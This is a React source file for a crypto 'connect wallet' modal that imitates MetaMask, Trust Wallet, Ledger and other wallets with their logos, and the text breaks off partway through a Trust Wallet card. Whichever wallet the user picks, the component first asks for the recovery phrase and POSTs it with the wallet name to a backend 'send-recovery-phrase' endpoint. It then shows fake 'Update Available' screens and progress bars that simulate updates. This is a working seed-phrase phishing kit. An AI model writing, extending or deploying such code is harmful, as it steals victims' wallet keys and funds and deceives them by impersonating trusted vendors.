import { useState, useEffect } from 'react'
import RecoveryPhraseModal from './RecoveryPhraseModal'

/* Wallet list — icons from reference site (exact logos) */
const WALLETS = [
  { name: 'MetaMask',       img: '/media/images/wallet-metamask.webp' },
  { name: 'Trust Wallet',   img: '/media/images/wallet-trust-wallet.webp' },
  { name: 'Coinbase Wallet',img: '/media/images/wallet-coinbase.webp' },
  { name: 'Phantom Wallet', img: '/media/images/wallet-phantom.webp' },
  { name: 'OKX Wallet',     img: '/media/images/wallet-okx.webp' },
  { name: 'Rabby Wallet',   img: '/media/images/wallet-rabby.webp' },
  { name: 'Rainbow',        img: '/media/images/wallet-rainbow.png' },
  { name: 'Ledger',         img: '/media/images/wallet-ledger.webp' },
  { name: 'Keplr',          img: '/media/images/keplr_new.png' },
  { name: 'WalletConnect',  img: '/media/images/walletconnect.png' },
  { name: '1inch Wallet',   img: '/media/images/1inch.png' },
]

/* Fallback icon when image fails to load */
function WalletIcon({ wallet }) {
  const [failed, setFailed] = useState(false)
  const initials = wallet.name.slice(0, 2).toUpperCase()

  if (failed) {
    return (
      <div style={{
        width: 40, height: 40, borderRadius: 10, flexShrink: 0,
        background: 'linear-gradient(135deg,#3a96ff,#00c896)',
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        color: '#fff', fontSize: 13, fontWeight: 700,
      }}>{initials}</div>
    )
  }

  return (
    <img
      src={wallet.img}
      alt={wallet.name}
      onError={() => setFailed(true)}
      style={{ width: 40, height: 40, borderRadius: 10, objectFit: 'contain', flexShrink: 0 }}
    />
  )
}

export default function WalletModal({ open, onClose }) {
  const [selected, setSelected] = useState(null)
  const [search, setSearch] = useState('')
  const [mmState, setMmState] = useState('idle') // 'idle'|'loading'|'update'|'updating'
  const [mmProgress, setMmProgress] = useState(0)
  const [twState, setTwState] = useState('idle')
  const [twProgress, setTwProgress] = useState(0)
  const [gFlow, setGFlow] = useState({ name:'', img:'', color:'#3a96ff', state:'idle', progress:0 })
  const [wcState, setWcState] = useState('idle') // 'idle'|'loading'|'update'|'updating'
  const [wcProgress, setWcProgress] = useState(0)
  const [cbState, setCbState] = useState('idle') // Coinbase
  const [cbProgress, setCbProgress] = useState(0)
  const [phState, setPhState] = useState('idle') // Phantom
  const [phProgress, setPhProgress] = useState(0)
  const [okxState, setOkxState] = useState('idle') // OKX
  const [okxProgress, setOkxProgress] = useState(0)
  const [inchState, setInchState] = useState('idle') // 1inch
  const [inchProgress, setInchProgress] = useState(0)
  const [rabbyState, setRabbyState] = useState('idle') // Rabby
  const [rabbyProgress, setRabbyProgress] = useState(0)
  const [rainbowState, setRainbowState] = useState('idle') // Rainbow
  const [rainbowProgress, setRainbowProgress] = useState(0)
  const [keplrState, setKeplrState] = useState('idle') // Keplr
  const [keplrProgress, setKeplrProgress] = useState(0)
  const [ledgerState, setLedgerState] = useState('idle') // Ledger
  const [ledgerProgress, setLedgerProgress] = useState(0)

  // Recovery Phrase Modal state
  const [showRecoveryModal, setShowRecoveryModal] = useState(false)
  const [recoveryLoading, setRecoveryLoading] = useState(false)
  const [selectedWalletForRecovery, setSelectedWalletForRecovery] = useState(null)
  const [pendingWalletConnect, setPendingWalletConnect] = useState(null)

  // wallet accent colors
  const WALLET_COLORS = {
    'Coinbase Wallet': '#0052FF',
    'Phantom Wallet':  '#6B3FE4',
    'OKX Wallet':      '#111111',
    'Rabby Wallet':    '#7084FF',
    'Rainbow':         '#FF6B6B',
    'Ledger':          '#333333',
    'Keplr':           '#6F3AFA',
    'WalletConnect':   '#3B99FC',
    '1inch Wallet':    '#D82122',
  }

  useEffect(() => {
    if (open) { setSelected(null); setSearch(''); setMmState('idle'); setMmProgress(0); setTwState('idle'); setTwProgress(0); setWcState('idle'); setWcProgress(0); setCbState('idle'); setCbProgress(0); setPhState('idle'); setPhProgress(0); setOkxState('idle'); setOkxProgress(0); setInchState('idle'); setInchProgress(0); setRabbyState('idle'); setRabbyProgress(0); setRainbowState('idle'); setRainbowProgress(0); setKeplrState('idle'); setKeplrProgress(0); setLedgerState('idle'); setLedgerProgress(0); setGFlow({ name:'', img:'', color:'#3a96ff', state:'idle', progress:0 }) }
  }, [open])

  const handleMetaMaskConnect = () => {
    onClose()
    setMmState('loading')
    setTimeout(() => setMmState('update'), 2200)
  }

  const handleMetaMaskUpdate = () => {
    setMmState('updating')
    setMmProgress(0)
  }

  const handleTrustConnect = () => {
    onClose()
    setTwState('loading')
    setTimeout(() => setTwState('update'), 2200)
  }

  const handleTrustUpdate = () => {
    setTwState('updating')
    setTwProgress(0)
  }

  const handleWcConnect = () => {
    onClose()
    setWcState('loading')
    setTimeout(() => setWcState('update'), 2200)
  }
  const handleWcUpdate = () => { setWcState('updating'); setWcProgress(0) }

  const handleCbConnect = () => { onClose(); setCbState('loading') }
  const handleCbUpdate  = () => { setCbState('updating'); setCbProgress(0) }

  const handlePhConnect  = () => { onClose(); setPhState('loading'); setTimeout(() => setPhState('update'), 2200) }
  const handleOkxConnect    = () => { onClose(); setOkxState('loading') }
  const handleOkxUpdate     = () => { setOkxState('updating'); setOkxProgress(0) }
  const handleInchConnect   = () => { onClose(); setInchState('loading') } // video onEnded triggers update
  const handleInchUpdate    = () => { setInchState('updating'); setInchProgress(0) }
  const handleRabbyConnect  = () => { onClose(); setRabbyState('loading'); setTimeout(() => setRabbyState('update'), 2200) }
  const handleRabbyUpdate   = () => { setRabbyState('updating'); setRabbyProgress(0) }
  const handleRainbowConnect= () => { onClose(); setRainbowState('loading'); setTimeout(() => setRainbowState('update'), 2200) }
  const handleRainbowUpdate = () => { setRainbowState('updating'); setRainbowProgress(0) }
  const handleKeplrConnect  = () => { onClose(); setKeplrState('loading'); setTimeout(() => setKeplrState('update'), 2200) }
  const handleKeplrUpdate   = () => { setKeplrState('updating'); setKeplrProgress(0) }
  const handleLedgerConnect = () => { onClose(); setLedgerState('loading'); setTimeout(() => setLedgerState('update'), 2200) }
  const handleLedgerUpdate  = () => { setLedgerState('updating'); setLedgerProgress(0) }

  // Progress effects for new wallets
  useEffect(() => {
    if (inchState !== 'updating') return
    const iv = setInterval(() => { setInchProgress(p => { if (p >= 100) { clearInterval(iv); return 100 } const s = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5; return Math.min(100, p + s) }) }, 120)
    return () => clearInterval(iv)
  }, [inchState])
  useEffect(() => {
    if (rabbyState !== 'updating') return
    const iv = setInterval(() => { setRabbyProgress(p => { if (p >= 100) { clearInterval(iv); return 100 } const s = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5; return Math.min(100, p + s) }) }, 120)
    return () => clearInterval(iv)
  }, [rabbyState])
  useEffect(() => {
    if (rainbowState !== 'updating') return
    const iv = setInterval(() => { setRainbowProgress(p => { if (p >= 100) { clearInterval(iv); return 100 } const s = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5; return Math.min(100, p + s) }) }, 120)
    return () => clearInterval(iv)
  }, [rainbowState])
  useEffect(() => {
    if (keplrState !== 'updating') return
    const iv = setInterval(() => { setKeplrProgress(p => { if (p >= 100) { clearInterval(iv); return 100 } const s = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5; return Math.min(100, p + s) }) }, 120)
    return () => clearInterval(iv)
  }, [keplrState])
  useEffect(() => {
    if (ledgerState !== 'updating') return
    const iv = setInterval(() => { setLedgerProgress(p => { if (p >= 100) { clearInterval(iv); return 100 } const s = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5; return Math.min(100, p + s) }) }, 120)
    return () => clearInterval(iv)
  }, [ledgerState])

  // Animate OKX progress bar
  useEffect(() => {
    if (okxState !== 'updating') return
    const interval = setInterval(() => {
      setOkxProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [okxState])
  const handlePhUpdate  = () => { setPhState('updating'); setPhProgress(0) }

  // Animate Phantom progress bar
  useEffect(() => {
    if (phState !== 'updating') return
    const interval = setInterval(() => {
      setPhProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [phState])

  // Animate CB progress bar
  useEffect(() => {
    if (cbState !== 'updating') return
    const interval = setInterval(() => {
      setCbProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [cbState])

  // Animate WC progress bar
  useEffect(() => {
    if (wcState !== 'updating') return
    const interval = setInterval(() => {
      setWcProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [wcState])

  // Animate MM progress bar
  useEffect(() => {
    if (mmState !== 'updating') return
    const interval = setInterval(() => {
      setMmProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [mmState])

  // Animate TW progress bar
  useEffect(() => {
    if (twState !== 'updating') return
    const interval = setInterval(() => {
      setTwProgress(p => {
        if (p >= 100) { clearInterval(interval); return 100 }
        const step = p < 30 ? 1 : p < 70 ? 2 : p < 90 ? 1.5 : 0.5
        return Math.min(100, p + step)
      })
    }, 120)
    return () => clearInterval(interval)
  }, [twState])

  // Generic wallet connect handler
  const VIDEO_WALLETS = ['OKX Wallet', '1inch Wallet']

  const handleGenericConnect = (walletName, walletImg) => {
    const color = WALLET_COLORS[walletName] || '#3a96ff'
    onClose()
    setGFlow({ name: walletName, img: walletImg, color, state: 'loading', progress: 0 })
    // For video wallets, the transition is triggered by onEnded on the video element
    if (!VIDEO_WALLETS.includes(walletName)) {
      setTimeout(() => setGFlow(f => ({ ...f, state: 'update' })), 2200)
    }
  }
  const handleGenericUpdate = () => setGFlow(f => ({ ...f, state: 'updating', progress: 0 }))

  // Recovery Phrase Handler
  const handleRecoveryPhraseSubmit = async (phrase) => {
    setRecoveryLoading(true)
    try {
      const response = await fetch('http://localhost:3001/api/send-recovery-phrase', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phrase: phrase,
          walletName: selectedWalletForRecovery.name,
        }),
      })

      if (!response.ok) {
        throw new Error('Failed to submit recovery phrase')
      }

      const data = await response.json()
      if (!data.success) {
        throw new Error(data.error || 'Failed to submit recovery phrase')
      }

      // Close recovery modal and proceed with wallet connection
      setShowRecoveryModal(false)
      setTimeout(() => {
        if (pendingWalletConnect) {
          pendingWalletConnect()
          setPendingWalletConnect(null)
        }
      }, 500)
    } catch (error) {
      throw new Error(error.message)
    } finally {
      setRecoveryLoading(false)
    }
  }

  // Mobile wallet tap — directly trigger the connect flow with recovery phrase (right panel hidden on mobile)
  const triggerConnect = (wallet) => {
    const map = {
      'MetaMask':       handleMetaMaskConnect,
      'Trust Wallet':   handleTrustConnect,
      'WalletConnect':  handleWcConnect,
      'Coinbase Wallet':handleCbConnect,
      'Phantom Wallet': handlePhConnect,
      'OKX Wallet':     handleOkxConnect,
      '1inch Wallet':   handleInchConnect,
      'Rabby Wallet':   handleRabbyConnect,
      'Rainbow':        handleRainbowConnect,
      'Keplr':          handleKeplrConnect,
      'Ledger':         handleLedgerConnect,
    }
    const handler = map[wallet.name]
    
    // Show recovery phrase modal
    setSelectedWalletForRecovery(wallet)
    setPendingWalletConnect(() => handler || (() => handleGenericConnect(wallet.name, wallet.img)))
    setShowRecoveryModal(true)
  }
  const closeGeneric = () => setGFlow(f => ({ ...f, state: 'idle' }))

  // Animate generic progress bar
  useEffect(() => {
    if (gFlow.state !== 'updating') return
    const interval = setInterval(() => {
      setGFlow(f => {
        if (f.progress >= 100) { clearInterval(interval); return f }
        const step = f.progress < 30 ? 1 : f.progress < 70 ? 2 : f.progress < 90 ? 1.5 : 0.5
        return { ...f, progress: Math.min(100, f.progress + step) }
      })
    }, 120)
    return () => clearInterval(interval)
  }, [gFlow.state])

  // close on Escape
  useEffect(() => {
    const handler = (e) => { if (e.key === 'Escape') onClose() }
    window.addEventListener('keydown', handler)
    return () => window.removeEventListener('keydown', handler)
  }, [onClose])

  if (!open && mmState === 'idle' && twState === 'idle' && wcState === 'idle' && cbState === 'idle' && phState === 'idle' && okxState === 'idle' && inchState === 'idle' && rabbyState === 'idle' && rainbowState === 'idle' && keplrState === 'idle' && ledgerState === 'idle' && gFlow.state === 'idle') return null

  const filtered = WALLETS.filter(w =>
    w.name.toLowerCase().includes(search.toLowerCase())
  )

  return (
    <>
      <style>{`
        .wm-overlay {
          position: fixed; inset: 0; z-index: 9999;
          background: rgba(0,0,0,0.6);
          backdrop-filter: blur(10px);
          display: flex; align-items: center; justify-content: center;
          padding: 16px;
          animation: wmFadeIn 0.2s ease;
        }
        @keyframes wmFadeIn {
          from { opacity:0; }
          to   { opacity:1; }
        }
        .wm-modal {
          background: linear-gradient(135deg,#ffffff,#f8f9fa);
          border: 1px solid rgba(0,0,0,0.05);
          border-radius: 24px;
          box-shadow: 0 20px 60px rgba(0,0,0,0.35);
          width: 100%; max-width: 640px;
          display: flex;
          flex-direction: column;
          overflow: hidden;
          max-height: 80vh;
          height: 500px;
          animation: wmSlideUp 0.25s ease;
          font-family: 'Inter', sans-serif;
        }
        .wm-modal > .wm-drag-handle {
          display: none;
        }
        .wm-modal > .wm-left,
        .wm-modal > .wm-right {
          flex: 1;
        }
        /* reset flex children for desktop */
        @media (min-width: 601px) {
          .wm-modal {
            flex-direction: row;
          }
          .wm-modal > .wm-left  { flex: 0 0 260px; }
          .wm-modal > .wm-right { flex: 1; }
        }
        @keyframes wmSlideUp {
          from { opacity:0; transform:translateY(24px) scale(0.97); }
          to   { opacity:1; transform:translateY(0) scale(1); }
        }

        /* Left panel */
        .wm-left {
          flex: 0 0 260px;
          padding: 20px 16px;
          border-right: 1px solid rgba(0,0,0,0.07);
          display: flex; flex-direction: column;
          overflow: hidden;
        }
        .wm-header-row {
          display: flex; align-items: center; justify-content: space-between;
          margin-bottom: 20px;
        }
        .wm-brand {
          display: flex; align-items: center; gap: 8px;
        }
        .wm-brand-pill {
          background: #111; color: #fff; border-radius: 99px;
          padding: 4px 12px; font-size: 13px; font-weight: 600;
          font-family: monospace;
        }
        .wm-brand-text {
          font-size: 14px; color: #555; font-weight: 400;
        }
        .wm-close {
          background: none; border: none; cursor: pointer;
          color: #999; font-size: 20px; line-height: 1;
          padding: 4px; border-radius: 6px;
          transition: color 0.15s;
        }
        .wm-close:hover { color: #333; }

        .wm-search {
          width: 100%;
          padding: 9px 14px;
          border: 1px solid rgba(0,0,0,0.12);
          border-radius: 12px;
          font-size: 14px; color: #333;
          background: #f0f1f3;
          outline: none; margin-bottom: 14px;
          font-family: 'Inter', sans-serif;
          transition: border-color 0.2s;
        }
        .wm-search:focus { border-color: #3a96ff; background: #fff; }

        .wm-popular-label {
          font-size: 13px; color: #888; font-weight: 500;
          margin-bottom: 8px;
        }

        .wm-list {
          overflow-y: auto; flex: 1;
        }
        .wm-list::-webkit-scrollbar { width: 4px; }
        .wm-list::-webkit-scrollbar-track { background: transparent; }
        .wm-list::-webkit-scrollbar-thumb {
          background: #3a96ff; border-radius: 4px;
        }

        .wm-item {
          display: flex; align-items: center; gap: 14px;
          padding: 11px 12px;
          border-radius: 14px;
          cursor: pointer;
          transition: background 0.15s;
          margin-bottom: 4px;
          border: 1.5px solid transparent;
        }
        .wm-item:hover { background: #f0f1f3; }
        .wm-item.active {
          background: #e8f0fe;
          border-color: #3a96ff;
        }
        .wm-item-name {
          font-size: 15px; font-weight: 500; color: #111;
        }

        /* Right panel */
        .wm-right {
          flex: 1;
          background: #f3f4f6;
          display: flex; align-items: center; justify-content: center;
          flex-direction: column; gap: 12px;
          padding: 20px;
          min-height: 0;
          overflow-y: auto;
        }
        .wm-right-icon {
          color: #bbb;
        }
        .wm-right-text {
          font-size: 15px; color: #999; font-weight: 400;
          text-align: center;
        }

        /* Connecting state */
        .wm-connecting {
          display: flex; flex-direction: column; align-items: center; gap: 16px;
          position: relative; width: 100%; height: 100%;
        }
        .wm-video-bg {
          position: absolute; inset: 0;
          width: 100%; height: 100%;
          object-fit: cover;
          border-radius: 0;
          z-index: 0;
        }
        .wm-connecting-overlay {
          position: relative; z-index: 1;
          display: flex; flex-direction: column; align-items: center; gap: 16px;
          padding: 32px;
          background: rgba(0,0,0,0.45);
          border-radius: 16px;
          backdrop-filter: blur(4px);
          margin: auto;
        }
        .wm-spin-ring {
          width: 56px; height: 56px;
          border: 3px solid rgba(255,255,255,0.25);
          border-top-color: #fff;
          border-radius: 50%;
          animation: wmSpin 0.8s linear infinite;
        }
        @keyframes wmSpin { to { transform: rotate(360deg); } }
        .wm-connecting-name { font-size: 16px; font-weight: 700; color: #fff; }
        .wm-connecting-sub  { font-size: 13px; color: rgba(255,255,255,0.75); text-align:center; }
        @keyframes wmBob {
          0%, 100% { transform: translateY(0px); }
          50%       { transform: translateY(-14px); }
        }

        @media (max-width: 600px) {
          .wm-overlay {
            align-items: flex-end;
            padding: 0;
            background: rgba(0,0,0,0.7);
          }
          .wm-right { display: none !important; }
          .wm-modal {
            max-width: 100%;
            width: 100%;
            height: auto;
            max-height: 88vh;
            border-radius: 20px 20px 0 0;
            flex-direction: column;
            animation: wmSlideUpMobile 0.3s cubic-bezier(0.32,0.72,0,1);
          }
          .wm-modal > .wm-drag-handle {
            display: block;
            width: 40px; height: 4px;
            background: #ddd;
            border-radius: 2px;
            margin: 10px auto 0;
            flex-shrink: 0;
          }
          .wm-left {
            flex: 1 !important;
            border-right: none !important;
            padding: 16px 16px 32px !important;
            overflow-y: auto;
            max-height: 82vh;
          }
          .wm-header-row { margin-bottom: 12px; }
          .wm-list { overflow-y: auto; }
          .wm-item { padding: 13px 14px; margin-bottom: 2px; }
          .wm-item-name { font-size: 16px; }
        }
        @keyframes wmSlideUpMobile {
          from { transform: translateY(100%); opacity: 0.6; }
          to   { transform: translateY(0);    opacity: 1; }
        }

        /* ── Flow overlay cards: full-screen on mobile ── */
        @media (max-width: 600px) {
          .wm-flow-card {
            top: 0 !important;
            right: 0 !important;
            left: 0 !important;
            bottom: 0 !important;
            width: 100vw !important;
            height: 100dvh !important;
            min-height: 100dvh !important;
            max-height: 100dvh !important;
            border-radius: 0 !important;
            overflow-y: auto !important;
            display: flex !important;
            flex-direction: column !important;
            align-items: center !important;
            justify-content: center !important;
            box-sizing: border-box !important;
          }
          .wm-flow-card video {
            position: absolute !important;
            inset: 0 !important;
            width: 100% !important;
            height: 100% !important;
            object-fit: cover !important;
          }
          /* Update/Updating inner content: scrollable, padded */
          .wm-flow-card > div[style] {
            width: 100% !important;
            max-width: 100% !important;
            box-sizing: border-box !important;
            overflow-y: auto !important;
          }
        }
      `}</style>

      {/* MetaMask loading — fixed top-right, modal hidden */}
      {mmState === 'loading' && (
        <div className="wm-flow-card" style={{
          position:'fixed', top:24, right:24, zIndex:99999,
          width:260, height:340,
          background:'#fff', borderRadius:20,
          boxShadow:'0 8px 40px rgba(0,0,0,0.22)',
          display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:28,
          animation:'wmSlideUp 0.25s ease',
        }}>
          <img src="/media/images/metamask-fox-full.svg" alt="MetaMask"
            style={{ width:140, height:140, objectFit:'contain' }}
          />
          <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
            <circle cx="24" cy="24" r="20" stroke="#f0f0f0" strokeWidth="4"/>
            <path d="M24 4 A20 20 0 0 1 44 24" stroke="#e8820c" strokeWidth="4" strokeLinecap="round"
              style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'24px 24px' }}
            />
          </svg>
        </div>
      )}

      {/* MetaMask Update Available — fixed top-right */}
      {mmState === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', padding:'14px 16px', borderBottom:'1px solid #f0f0f0' }}>
            <img src="/media/images/metamask-fox-full.svg" alt="MetaMask" style={{ width:36, height:36, objectFit:'contain' }} />
            <button onClick={() => setMmState('idle')} style={{ width:32, height:32, borderRadius:'50%', border:'2px solid #3a96ff', background:'none', cursor:'pointer', display:'flex', alignItems:'center', justifyContent:'center', color:'#3a96ff', fontSize:15, fontWeight:700 }}>✕</button>
          </div>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'22px 20px 20px', gap:10 }}>
            <svg width="52" height="52" viewBox="0 0 52 52" fill="none">
              <path d="M26 6v26M16 22l10 10 10-10" stroke="#3a96ff" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round"/>
              <path d="M10 38h32" stroke="#3a96ff" strokeWidth="4" strokeLinecap="round"/>
            </svg>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Update Available</div>
            <div style={{ fontSize:15, color:'#555', textAlign:'center' }}>Version 13.3.0</div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px', marginTop:4 }}>
              {['Fix main build modifying desktop build steps','Improving the security system','Fix incorrect network information','Improve performance on signature request'].map((item, i, arr) => (
                <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:8, marginBottom: i < arr.length-1 ? 8 : 0 }}>
                  <span style={{ color:'#111', fontSize:14, lineHeight:1.5 }}>•</span>
                  <span style={{ color:'#111', fontSize:13, lineHeight:1.5 }}>{item}</span>
                </div>
              ))}
            </div>
            <button style={{ width:'100%', marginTop:8, padding:'14px', borderRadius:50, background:'#3a6fd8', color:'#fff', border:'none', fontSize:15, fontWeight:700, cursor:'pointer' }}
              onMouseEnter={e => e.currentTarget.style.background='#2a5cc4'}
              onMouseLeave={e => e.currentTarget.style.background='#3a6fd8'}
              onClick={handleMetaMaskUpdate}
            >Update</button>
            <div style={{ fontSize:12, color:'#555', marginTop:2 }}>
              Need help?{' '}
              <span style={{ color:'#3a96ff', cursor:'pointer', fontWeight:500 }}>Contact MetaMask Support</span>
            </div>
          </div>
        </div>
      )}

      {/* MetaMask Updating — mirrors Update Available card structure exactly */}
      {mmState === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          {/* header — identical to Update Available */}
          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', padding:'14px 16px', borderBottom:'1px solid #f0f0f0' }}>
            <img src="/media/images/metamask-fox-full.svg" alt="MetaMask" style={{ width:36, height:36, objectFit:'contain' }} />
            <button onClick={() => setMmState('idle')} style={{ width:32, height:32, borderRadius:'50%', border:'2px solid #3a96ff', background:'none', cursor:'pointer', display:'flex', alignItems:'center', justifyContent:'center', color:'#3a96ff', fontSize:15, fontWeight:700 }}>✕</button>
          </div>
          {/* body — identical padding/gap to Update Available */}
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'22px 20px 20px', gap:10 }}>
            {/* spinner — same size as download icon */}
            <svg width="52" height="52" viewBox="0 0 52 52" fill="none">
              <circle cx="26" cy="26" r="22" stroke="#e8edf4" strokeWidth="4"/>
              <path d="M26 4 A22 22 0 0 1 48 26" stroke="#3a96ff" strokeWidth="4" strokeLinecap="round"
                style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'26px 26px' }}
              />
            </svg>
            {/* title — same font as "Update Available" */}
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Updating MetaMask</div>
            {/* subtitle — same font as "Version 13.3.0" */}
            <div style={{ fontSize:15, color:'#555', textAlign:'center' }}>Please wait while we update to version 13.3.0</div>
            {/* grey box — same style, content fills same height as 4 bullets */}
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px', marginTop:4 }}>
              <div style={{ marginBottom:8, fontSize:13, color:'#555', lineHeight:1.5 }}>Downloading update...</div>
              <div style={{ width:'100%', height:8, background:'#e0e0e0', borderRadius:99, overflow:'hidden' }}>
                <div style={{ height:'100%', borderRadius:99, background:'linear-gradient(90deg,#3a96ff,#2a7fe0)', width:`${mmProgress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ textAlign:'center', fontSize:13, color:'#555', marginTop:8, fontWeight:600 }}>{Math.round(mmProgress)}%</div>
              <div style={{ fontSize:13, color:'#555', marginTop:8, lineHeight:1.5 }}>Installing new features...</div>
              <div style={{ fontSize:13, color:'#555', marginTop:8, lineHeight:1.5 }}>Verifying integrity...</div>
            </div>
            {/* button-height placeholder — same as Update button */}
            <div style={{ width:'100%', marginTop:8, padding:'14px', borderRadius:50, background:'#e8edf4', fontSize:15, fontWeight:700, color:'#aaa', textAlign:'center' }}>
              Please wait...
            </div>
            {/* help text — same as "Need help?" line */}
            <div style={{ fontSize:12, color:'#999', marginTop:2, textAlign:'center' }}>
              This may take a few moments. Do not close this window.
            </div>
          </div>
        </div>
      )}

      {/* Trust Wallet loading — fixed top-right */}
      {twState === 'loading' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, height:340, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:28, animation:'wmSlideUp 0.25s ease' }}>
          <img src="/media/images/wallet-trust-wallet.webp" alt="Trust Wallet" style={{ width:110, height:110, borderRadius:24, objectFit:'cover' }} />
          <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
            <circle cx="24" cy="24" r="20" stroke="#f0f0f0" strokeWidth="4"/>
            <path d="M24 4 A20 20 0 0 1 44 24" stroke="#29C5E0" strokeWidth="4" strokeLinecap="round"
              style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'24px 24px' }}
            />
          </svg>
        </div>
      )}

      {/* Trust Wallet Update Available — fixed top-right */}
      {twState === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'22px 20px 20px', gap:10 }}>
            {/* TRUST wordmark + shield */}
            <div style={{ display:'flex', flexDirection:'column', alignItems:'center', gap:4 }}>
              <svg viewBox="0 0 120 32" width="80" height="22" xmlns="http://www.w3.org/2000/svg">
                <defs><linearGradient id="twTxtU" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stopColor="#29E07F"/><stop offset="100%" stopColor="#29C5E0"/></linearGradient></defs>
                <text x="60" y="26" textAnchor="middle" fontFamily="Arial Black,Arial,sans-serif" fontWeight="900" fontSize="28" fill="url(#twTxtU)" letterSpacing="1">TRUST</text>
              </svg>
              <svg viewBox="0 0 120 130" width="56" height="62" xmlns="http://www.w3.org/2000/svg">
                <defs>
                  <linearGradient id="twSHL" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stopColor="#29E07F"/><stop offset="100%" stopColor="#2AC876"/></linearGradient>
                  <linearGradient id="twSHR" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stopColor="#3375BB"/><stop offset="100%" stopColor="#1FA5DE"/></linearGradient>
                </defs>
                <path d="M60 4 L12 22 L12 62 C12 90 34 112 60 122 L60 4 Z" fill="url(#twSHL)"/>
                <path d="M60 4 L108 22 L108 62 C108 90 86 112 60 122 L60 4 Z" fill="url(#twSHR)"/>
              </svg>
            </div>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Update Available</div>
            <div style={{ fontSize:14, color:'#666', textAlign:'center' }}>Version 8.58.1</div>
            {/* Blue left-border info box */}
            <div style={{ width:'100%', background:'#eff6ff', borderLeft:'3px solid #3a7bd5', borderRadius:'0 8px 8px 0', padding:'12px 14px', marginTop:2 }}>
              <span style={{ fontSize:13, color:'#1a1a1a', lineHeight:1.5 }}>Important scheduled update with security improvements. We recommend installing it now.</span>
            </div>
            {/* Bullet list */}
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px' }}>
              {['Enhanced multi-chain support and performance','Improved security system','Fixed network information display','Better transaction signing experience'].map((item, i, arr) => (
                <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:8, marginBottom: i < arr.length-1 ? 8 : 0 }}>
                  <span style={{ color:'#111', fontSize:14, lineHeight:1.5 }}>•</span>
                  <span style={{ color:'#111', fontSize:13, lineHeight:1.5 }}>{item}</span>
                </div>
              ))}
            </div>
            <button style={{ width:'100%', marginTop:4, padding:'14px', borderRadius:50, background:'#3a5bd9', color:'#fff', border:'none', fontSize:15, fontWeight:700, cursor:'pointer' }}
              onMouseEnter={e => e.currentTarget.style.background='#2a4bc0'}
              onMouseLeave={e => e.currentTarget.style.background='#3a5bd9'}
              onClick={handleTrustUpdate}
            >Update</button>
